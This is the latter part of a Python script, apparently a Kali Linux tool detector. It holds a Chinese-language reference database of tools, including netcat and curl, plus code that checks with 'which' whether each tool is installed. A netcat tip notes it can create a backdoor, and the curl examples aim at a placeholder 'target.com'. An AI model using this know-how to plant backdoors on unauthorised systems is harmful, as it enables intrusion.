                    ],
                    'tips': [
                        '可以创建后门',
                        '传输文件很方便',
                        '支持端口扫描'
                    ],
                    'common_options': {
                        '-l': '监听模式',
                        '-v': '详细输出',
                        '-p': '端口',
                        '-n': '不解析DNS',
                    }
                },
                'curl': {
                    'name': 'Curl',
                    'command': 'curl {url}',
                    'description': '命令行HTTP客户端',
                    'usage': 'curl [选项] {URL}',
                    'examples': [
                        {'cmd': 'curl http://target.com', 'desc': '获取页面'},
                        {'cmd': 'curl -X POST -d "data=1" http://target.com', 'desc': 'POST请求'},
                        {'cmd': 'curl -H "Header: value" http://target.com', 'desc': '自定义头'},
                        {'cmd': 'curl -O http://target.com/file.zip', 'desc': '下载文件'},
                    ],
                    'tips': [
                        '支持多种协议',
                        '-X 指定方法',
                        '-H 添加头'
                    ],
                    'common_options': {
                        '-X': '请求方法',
                        '-d': 'POST数据',
                        '-H': '自定义头',
                        '-o': '输出文件',
                        '-O': '保存原名',
                    }
                },
            }
        }
    }

    def __init__(self):
        self.detected_tools = {}
        
    def check_tool_exists(self, tool_name):
        """检查工具是否存在"""
        result = subprocess.run(
            ['which', tool_name],
            capture_output=True,
            text=True
        )
        return result.returncode == 0
    
    def get_tool_path(self, tool_name):
        """获取工具路径"""
        result = subprocess.run(
            ['which', tool_name],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            return result.stdout.strip()
        return None
    
    def detect_all_tools(self):
        """检测所有已安装的工具"""
        detected = {}
        
        for category, category_data in self.TOOLS_DATABASE.items():
            detected_tools_in_category = []
            
            for tool_key, tool_info in category_data['tools'].items():
                if self.check_tool_exists(tool_key):
                    tool_info['installed'] = True
                    tool_info['path'] = self.get_tool_path(tool_key)
                    detected_tools_in_category.append({
                        'key': tool_key,
                        **tool_info
                    })
                else:
                    tool_info['installed'] = False
                    
            if detected_tools_in_category:
                detected[category] = {
                    'description': category_data['description'],
                    'icon': category_data['icon'],
                    'tools': detected_tools_in_category
                }
                
        self.detected_tools = detected
        return detected
    
    def get_tools_database(self):
        """获取完整工具数据库"""
        return self.TOOLS_DATABASE
    
    def get_all_tools_flat(self):
        """获取所有工具的扁平列表"""
        all_tools = []
        for category, data in self.TOOLS_DATABASE.items():
            for tool_key, tool_info in data['tools'].items():
                all_tools.append({
                    'key': tool_key,
                    'category': category,
                    **tool_info
                })
        return all_tools
    
    def search_tools(self, keyword):
        """搜索工具"""
        results = []
        keyword = keyword.lower()
        
        for category, data in self.TOOLS_DATABASE.items():
            for tool_key, tool_info in data['tools'].items():
                if (keyword in tool_key.lower() or 
                    keyword in tool_info.get('name', '').lower() or
                    keyword in tool_info.get('description', '').lower()):
                    results.append({
                        'key': tool_key,
                        'category': category,
                        **tool_info
                    })
        
        return results


if __name__ == '__main__':
    detector = KaliToolDetector()
    detected = detector.detect_all_tools()
    
    print("\n🔍 Kali工具检测结果:\n")
    
    total_tools = 0
    installed_count = 0
    
    for category, data in detected.items():
        print(f"{data['icon']} {category}")
        print(f"   {data['description']}")
        print(f"   已安装: {len(data['tools'])} 个工具")
        
        for tool in data['tools']:
            print(f"   ✅ {tool['name']} ({tool['key']})")
            installed_count += 1
            
        print()
        total_tools += len(data['tools'])
    
    print(f"\n总计: {installed_count} 个工具已安装")
